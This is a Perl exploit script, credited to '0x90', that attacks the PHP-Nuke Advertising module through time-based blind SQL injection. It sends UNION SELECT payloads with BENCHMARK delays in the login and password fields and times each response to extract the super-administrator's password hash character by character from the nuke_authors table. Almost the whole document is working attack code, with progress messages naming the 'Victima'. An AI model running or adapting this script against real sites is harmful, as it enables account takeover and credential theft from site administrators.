
#!/usr/bin/perl
#Product: PHP-Nuke Module Advertising
#BugFounder: 0x90
#HomePage: WwW.0x90.COM.Ar
#Problem: Blind SQL Injection



use strict;
use warnings;
use LWP;
use Time::HiRes;
use IO::Socket;


my $host = "http://[url]/modules.php?name=Advertising";

my $useragent = LWP::UserAgent->new;
my $metodo = HTTP::Request->new(POST =$host);

my $post;
my $inicio;
my $risposta;
my $fine;
my $tiempodefault;
my $tiempo;
my $i;
my $j;
my $hash;
my @array;

@array = (48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);


$post="login=a&pass=a&op=client_valid";
$tiempodefault=richiesta($post);
$hash="";

#QUERY RISULTANTE

#SELECT * FROM nuke_banner_clients WHERE login='a' UNION SELECT
0,0,0,0,0,0, IF((ASCII(SUBSTRING(`pwd`,
1,1))=112),benchmark(200000000,CHAR(0)),'falso') FROM nuke_authors WHERE
`radminsuper`=1/*


for ($i=1;$i<33;$i++)
{
for ($j=0;$j<16;$j++)
{
 $post="login=a' UNION SELECT 0,0,0,0,0,0, IF((ASCII(SUBSTRING(`pwd`," . $i
. ",1))=".$array[$j]."),benchmark(200000000,CHAR(0)),'falso') FROM
nuke_authors WHERE `radminsuper`=1/*&pass=a' UNION SELECT 0,0,0,0,0,0,
IF((ASCII(SUBSTRING(`pwd`," . $i . ",1))=".
$array[$j]."),benchmark(200000000,CHAR(0)),'falso') FROM nuke_authors WHERE
`radminsuper`=1/*&op=client_valid";
 $tiempo=richiesta($post);
 aggiorna($host,$tiempodefault,$j,$hash,$tiempo,$i);
 if($tiempo>10)
 {
  $tiempo=richiesta($post);
  aggiorna($host,$tiempodefault,$j,$hash,$tiempo,$i);
  if($tiempo>10)
  {
   $hash .=chr($array[$j]);
   aggiorna($host,$tiempodefault,$j,$hash,$tiempo,$i);
   $j=200;
  }
 }


}
if($i==1)
{
 if($hash eq "")
 {
  $i=200;
  print "El atake Fallo\n";
 }
}
}

print "Atake Terminado\n\n";

system("pause");


sub richiesta{
$post=$_[0];
$metodo->content_type('application/x-www-form-urlencoded');
  $metodo->content($post);
$inicio=Time::HiRes::time();
$risposta=$useragent->request($metodo);
$risposta->is_success or die "$host : ",$risposta->message,"\n";
$fine=Time::HiRes::time();
$tiempo=$fine-$inicio;
return $tiempo
}

sub aggiorna{
system("cls");
@array = (48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
print "PHP-Nuke Module Advertising Blind SQL Injection\n";
print "by 0x90\n";
print "Visit: WwW.0x90.CoM.Ar\n\n";
print "Victima : " . $_[0] . "\n";
print "Tiempo Default : " . $_[1] . " secondi\n";
print "Hash Bruteforce : " . chr($array[$_[2]]) . "\n";
print "Bruteforce n Caracter Hash : " . $_[5] . "\n";
print "Tiempo sql : " . $_[4] . " secondi\n";
print "Hash : " . $_[3] . "\n";
}
